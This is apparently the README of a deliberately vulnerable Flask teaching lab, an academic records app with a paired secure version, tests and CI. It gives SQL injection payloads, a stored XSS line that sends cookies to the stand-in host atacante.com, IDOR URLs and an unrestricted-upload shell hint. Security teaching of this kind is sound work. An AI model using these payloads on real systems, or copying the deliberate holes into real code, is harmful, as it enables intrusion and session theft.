# Laboratorio S-SDLC

Aplicación Flask **intencionalmente vulnerable** para prácticas de Seguridad en el Ciclo de Vida de Desarrollo de Software (S-SDLC), con una **versión segura** paralela que sirve como referencia de corrección.

> **ADVERTENCIA:** Esta aplicación contiene vulnerabilidades de seguridad deliberadas. Úsala **únicamente** en un entorno local y aislado, con fines educativos. No la despliegues en producción ni en redes públicas.

---

## Tabla de contenidos

- [Descripción](#descripción)
- [Versiones del laboratorio](#versiones-del-laboratorio)
- [Requisitos](#requisitos)
- [Stack tecnológico](#stack-tecnológico)
- [Puesta en marcha](#puesta-en-marcha)
- [Configuración](#configuración)
- [Credenciales de prueba](#credenciales-de-prueba)
- [Estructura del proyecto](#estructura-del-proyecto)
- [Rutas disponibles](#rutas-disponibles)
- [Vulnerabilidades incluidas](#vulnerabilidades-incluidas)
  - [1. Inyección SQL (SQLi)](#1-inyección-sql-sqli)
  - [2. Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
  - [3. Control de acceso roto (IDOR)](#3-control-de-acceso-roto-idor)
  - [4. Carga de archivos sin restricción](#4-carga-de-archivos-sin-restricción)
- [Medidas de seguridad de la versión segura](#medidas-de-seguridad-de-la-versión-segura)
- [Pruebas](#pruebas)
- [Integración continua (CI)](#integración-continua-ci)
- [Flujo de trabajo (Git)](#flujo-de-trabajo-git)
- [Notas adicionales](#notas-adicionales)

---

## Descripción

Sistema de gestión académica con funcionalidades básicas (login, búsqueda de estudiantes, perfiles, calificaciones y carga de archivos). El proyecto presenta **dos implementaciones paralelas** de la misma aplicación:

- Una **intencionalmente vulnerable**, con **4 vulnerabilidades clásicas** de OWASP para practicar identificación, explotación y mitigación.
- Una **versión segura**, que corrige esas vulnerabilidades y añade endurecimiento adicional, útil como referencia de "cómo se arregla".

---

## Versiones del laboratorio

| Aspecto       | Versión vulnerable              | Versión segura                        |
|---------------|---------------------------------|---------------------------------------|
| Archivo       | `app.py`                        | `app_segura.py`                       |
| Modelo de datos | `database.py` (SQL crudo)     | `models.py` (SQLAlchemy ORM)          |
| Plantillas    | `templates/`                    | `templates_seguras/`                  |
| Configuración | Constantes hardcodeadas         | `config.py` por entorno               |
| Puerto        | `5000`                          | `3001`                                |
| Base de datos | `academia.db`                   | `academia_segura.db`                  |
| Estado        | Dejada intacta                  | Creada en archivos paralelos          |

> La versión vulnerable **no fue modificada**; la segura vive en archivos nuevos para poder comparar ambos flujos.

---

## Requisitos

- [uv](https://docs.astral.sh/uv/) — gestor de paquetes y entornos virtuales
- Python 3.12+ (uv lo instala/gestiona automáticamente vía `.python-version`)

---

## Stack tecnológico

| Capa | Tecnología | Notas |
|------|------------|-------|
| Lenguaje | Python 3.12 | Fijado en `.python-version` |
| Gestor de dependencias | `uv` | No usar `pip install` directamente |
| Framework web | Flask 3.1.x | Versión vulnerable |
| ORM | Flask-SQLAlchemy 3.1.x | Solo en la versión segura |
| Variables de entorno | python-dotenv | Solo en la versión segura |
| Base de datos | SQLite | `academia.db` (vulnerable) / `academia_segura.db` (segura) |
| Linting / formato | `ruff` | Reemplaza a `black`, `isort`, `flake8` |
| Testing | `pytest` | Suite de pruebas de seguridad en `tests/` |
| Seguridad estática | `bandit` | Modo *advisory* (no bloquea) |
| Hooks pre-commit | `pre-commit` | Ejecuta ruff, bandit y commitlint |
| Commits | Conventional Commits + `commitlint` | Validado por hook `commit-msg` |
| Versionado | `release-please` | Acción de GitHub sobre `main` |

---

## Puesta en marcha

```bash
# Instalar dependencias y crear el entorno virtual
uv sync

# ---------- Versión vulnerable (puerto 5000) ----------
uv run app.py

# ---------- Versión segura (puerto 3001) ----------
uv run app_segura.py
```

- Versión vulnerable: <http://127.0.0.1:5000>
- Versión segura: <http://127.0.0.1:3001>

> La base de datos de cada versión se crea automáticamente en el primer arranque y se siembran los datos de ejemplo.

---

## Configuración

La **versión segura** se configura mediante variables de entorno (cargadas con `python-dotenv`). Crea un archivo `.env` a partir de `.env.example`:

| Variable        | Requerida | Valor por defecto                    | Descripción |
|-----------------|-----------|--------------------------------------|-------------|
| `SECRET_KEY`    | **Sí**    | —                                    | Clave de firma de sesiones. Si falta, la app **falla al arrancar**. |
| `APP_ENV`       | No        | `development`                        | Entorno activo: `development`, `production` o `testing`. |
| `FLASK_DEBUG`   | No        | `false`                              | Activa el modo depuración (`1`, `true`, `yes`). |
| `DATABASE_URI`  | No        | `sqlite:///academia_segura.db`       | URI de conexión a la base de datos. |
| `UPLOAD_FOLDER` | No        | `uploads_seguras`                    | Carpeta de archivos subidos. |

> La **versión vulnerable** no usa variables de entorno: `app.secret_key` y `debug=True` están fijados en el código (mala práctica deliberada).

---

## Credenciales de prueba

| Usuario      | Contraseña | Rol         |
|--------------|------------|-------------|
| `admin`      | `admin123` | admin       |
| `profesor`   | `clave456` | docente     |
| `estudiante` | `1234`     | estudiante  |

> En la versión segura estas contraseñas se almacenan como **hash** (`pbkdf2:sha256`), no en texto plano.

---

## Estructura del proyecto

```
├── app.py                    # Aplicación vulnerable (rutas y lógica)
├── database.py               # BD y datos de ejemplo (vulnerable)
├── app_segura.py             # Aplicación segura (versión corregida)
├── config.py                 # Configuración por entorno (segura)
├── models.py                 # Modelos SQLAlchemy (segura)
├── templates/                # Plantillas Jinja2 (vulnerable)
├── templates_seguras/        # Plantillas Jinja2 (segura, sin | safe)
├── static/                   # Hojas de estilo
│   └── style.css
├── uploads/                  # Archivos subidos (vulnerable)
├── uploads_seguras/          # Archivos subidos (segura)
├── tests/                    # Pruebas automatizadas (versión segura)
│   ├── conftest.py           # Fixtures compartidos (BD en memoria)
│   ├── test_auth.py          # Autenticación y hash de contraseñas
│   ├── test_sqli.py          # Inyección SQL
│   ├── test_xss.py           # Cross-Site Scripting
│   ├── test_idor.py          # Control de acceso (IDOR)
│   ├── test_uploads.py       # Validación de carga de archivos
│   └── test_security_headers.py  # Cabeceras HTTP de seguridad
├── .env.example              # Plantilla de variables de entorno
├── pyproject.toml            # Proyecto y dependencias (uv)
├── .pre-commit-config.yaml   # Hooks de pre-commit (ruff, bandit, commitlint)
├── .commitlintrc.json        # Reglas de Conventional Commits
├── release-please-config.json      # Configuración de release-please
├── .release-please-manifest.json   # Manifiesto de versión
├── .github/workflows/release-please.yml  # Versionado automático
├── AGENTS.md                 # Guía para agentes de IA
├── BITACORA.md               # Decisiones técnicas y cambios relevantes
├── README.md
└── uv.lock                   # Versiones bloqueadas
```

---

## Rutas disponibles

### Versión vulnerable

| Método  | Ruta                    | Descripción                         |
|---------|-------------------------|-------------------------------------|
| GET     | `/`                     | Página de inicio                    |
| GET/POST | `/login`               | Inicio de sesión (**SQLi**)         |
| GET     | `/logout`               | Cerrar sesión                       |
| GET     | `/buscar?q=<término>`   | Buscador de estudiantes (**SQLi**)  |
| GET     | `/perfil/<id>`          | Perfil de estudiante (**XSS**)      |
| GET/POST | `/perfil/<id>/editar`  | Editar biografía (fuente **XSS**)   |
| GET/POST | `/nota/editar/<id>`    | Editar calificación (**IDOR**)      |
| GET/POST | `/subir`               | Carga de archivos (**sin restricción**)|

### Versión segura

Mismas rutas, con correcciones aplicadas:

| Ruta                    | Corrección |
|-------------------------|------------|
| `/login`, `/buscar`     | Consultas parametrizadas vía ORM (sin SQLi) |
| `/perfil/<id>`          | Autoescape de Jinja2 activado (sin XSS) |
| `/perfil/<id>/editar`   | `@login_required` + solo propietario o staff |
| `/nota/editar/<id>`     | `@login_required` + solo propietario o staff |
| `/subir`                | `@login_required` + `secure_filename` + whitelist + límite 2 MB |

---

## Vulnerabilidades incluidas

### 1. Inyección SQL (SQLi)

**Ubicación:** `/login` y `/buscar`

Las consultas SQL construyen la cadena concatenando directamente la entrada del usuario sin sanitizar ni usar consultas parametrizadas.

**Ejemplo de explotación en `/login`:**

```
Usuario: admin' --
Contraseña: (cualquiera)
```

Esto comenta el resto de la consulta y permite autenticarse como `admin` sin conocer la contraseña.

**Ejemplo de explotación en `/buscar` (UNION-based):**

```sql
' UNION SELECT id, username, password, rol FROM usuarios --
```

Extrae las credenciales de todos los usuarios de la base de datos.

---

### 2. Cross-Site Scripting (XSS)

**Ubicación:** `/perfil/<id>`

La biografía del estudiante se guarda sin sanear y se renderiza en la plantilla con el filtro `| safe` de Jinja2, desactivando el autoescape. Esto permite **XSS almacenado**.

**Ejemplo de explotación:**

Editar la biografía de un estudiante con:

```html
<script>alert('XSS')</script>
```

O más malicioso:

```html
<script>fetch('https://atacante.com/steal?cookie='+document.cookie)</script>
```

Cualquier usuario que visite el perfil ejecutará el script.

---

### 3. Control de acceso roto (IDOR)

**Ubicación:** `/nota/editar/<id>`

La ruta no verifica si el usuario ha iniciado sesión, ni su rol, ni si la calificación le pertenece. Cualquier persona puede modificar cualquier calificación cambiando el ID en la URL.

**Ejemplo de explotación:**

```
GET /nota/editar/1   # modificar la nota con ID 1
GET /nota/editar/2   # modificar la nota con ID 2 (de otro estudiante)
```

---

### 4. Carga de archivos sin restricción

**Ubicación:** `/subir`

El formulario de carga acepta **cualquier** tipo de archivo sin validar extensión, contenido ni tamaño. Un atacante puede subir scripts ejecutables (`.py`, `.php`, `.html` con JavaScript, etc.).

**Ejemplo de explotación:**

Subir un archivo `shell.php` con código PHP malicioso o un `.html` con JavaScript que se ejecute cuando otro usuario lo abra.

---

## Medidas de seguridad de la versión segura

Además de corregir las 4 vulnerabilidades, la versión segura incluye:

- **ORM (Flask-SQLAlchemy):** toda consulta pasa por el ORM, eliminando la superficie de SQLi.
- **Hash de contraseñas:** `pbkdf2:sha256` con sal automática (`werkzeug.security`).
- **Cabeceras HTTP:** CSP, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy` y `Permissions-Policy`.
- **Control de acceso:** decorador `login_required` y verificación por rol/propietario.
- **Validación de uploads:** `secure_filename`, lista blanca de extensiones, nombre único con UUID y límite de 2 MB.
- **Prevención de fijación de sesión:** `session.clear()` antes de autenticar.
- **Endurecimiento de cookies:** `HTTPONLY`, `SAMESITE`, `SECURE` en producción.
- **Validación de entrada:** límite de caracteres en biografía y rango de notas (0–5).
- **Configuración por entorno:** separa `development`, `production` y `testing`, y exige `SECRET_KEY`.

---

## Pruebas

El directorio `tests/` contiene una suite de **pruebas automatizadas** (pytest) que validan la versión segura. Su objetivo es verificar que las correcciones funcionan y que no se introducen regresiones.

### Ejecutar las pruebas

```bash
# Incluir dependencias de desarrollo (pytest, ruff, bandit, pre-commit)
uv sync --dev

# Ejecutar la suite completa
uv run pytest
```

### Cobertura

| Archivo | Qué verifica |
|---------|--------------|
| `test_auth.py` | Login correcto/incorrecto, usuario inexistente, hash de contraseñas, redirección de rutas protegidas |
| `test_sqli.py` | Login y búsqueda no vulnerables a inyección SQL |
| `test_xss.py` | Escape de biografía en perfil y en resultados de búsqueda |
| `test_idor.py` | Estudiante no edita recursos ajenos (403), sí los propios (200); docente sí puede |
| `test_uploads.py` | Lista blanca de extensiones, límite de tamaño (413), requiere autenticación |
| `test_security_headers.py` | Presencia de CSP, `X-Frame-Options`, `X-Content-Type-Options` y `Referrer-Policy` |
| `conftest.py` | Fixtures: BD en memoria (`APP_ENV=testing`) recreada en cada test y clientes autenticados |

### Enfoque

- **Regresión de seguridad:** se prueba que los ataques conocidos **fallan**, no solo el happy path.
- **Aislamiento:** cada test usa una BD en memoria y una carpeta de uploads temporal, sin estado compartido.
- **Documentación viva:** los tests muestran de forma concreta qué se corrigió y por qué.

---

## Integración continua (CI)

Se configura un pipeline de GitHub Actions en `.github/workflows/ci.yml` que se ejecuta en cada `push` y `pull_request` sobre `main` y `dev`, y también puede dispararse manualmente (`workflow_dispatch`).

### Jobs

| Job | Herramienta | Propósito |
|-----|-------------|-----------|
| `lint` | `ruff check` + `ruff format --check` | Estilo de código y formato uniforme |
| `security` | `bandit -c pyproject.toml -r .` | Análisis de seguridad estático |
| `tests` | `uv run pytest -q` | Ejecución de la suite de pruebas de seguridad |

Todos los jobs usan `astral-sh/setup-uv@v10.3.0` con Python 3.12, caché de uv habilitado e instalan dependencias con `uv sync --dev`.

### Configuración clave

- **Bandit excluye archivos intencionalmente vulnerables:** `app.py` y `database.py` están en `[tool.bandit] exclude_dirs` para que el análisis de seguridad estático no falle por las vulnerabilidades deliberadas del laboratorio original.
- **Permisos mínimos:** el job corre con `contents: read` (principio de mínimo privilegio).
- **Concurrencia:** `ci-${{ github.ref }}` con `cancel-in-progress: true` evita ejecuciones duplicadas y descarta pipelines obsoletos.
- **Ramas cubiertas:** `main` y `dev`, garantizando que ambas pasen validaciones antes de cualquier merge o release.

---

## Flujo de trabajo (Git)

El repositorio sigue un flujo de **Git Flow simplificado**:

- `main`: rama protegida; solo recibe cambios mediante **Pull Requests**.
- `dev`: rama de integración.
- Ramas de corta duración (`feat/`, `fix/`, `docs/`, `refactor/`) creadas desde `dev` y fusionadas con `--no-ff`.

**Reglas clave:**

- No hacer push directo a `main`.
- Usar **Conventional Commits** (`feat:`, `fix:`, `docs:`, `chore:`, ...), validado por `commitlint`.
- Ejecutar `uv run ruff check .` y `uv run bandit -r app.py database.py` antes de commitear.
- Ejecutar `uv run pytest` para validar la versión segura antes de integrar cambios.
- `release-please` genera versiones y changelog automáticamente a partir de los commits en `main`.

---

## Notas adicionales

- **Versión vulnerable:** contraseñas en texto plano, `app.secret_key` fija e insegura, y `debug=True` (consola de Werkzeug expuesta). Malas prácticas **deliberadas** para clase.
- **Versión segura:** contraseñas hasheadas, configuración por entorno, `debug` desactivado por defecto y endurecimiento activo.
- **Bases de datos:** se crean automáticamente en el primer arranque (`academia.db` y `academia_segura.db`). No se versionan.
- **Pruebas:** la suite cubre solo la **versión segura** (`app_segura.py`), validando la ausencia de las 4 vulnerabilidades originales.
- **Artefactos locales:** `academia.db`, `academia_segura.db`, `uploads/*`, `uploads_seguras/` y `.env` están en `.gitignore`.
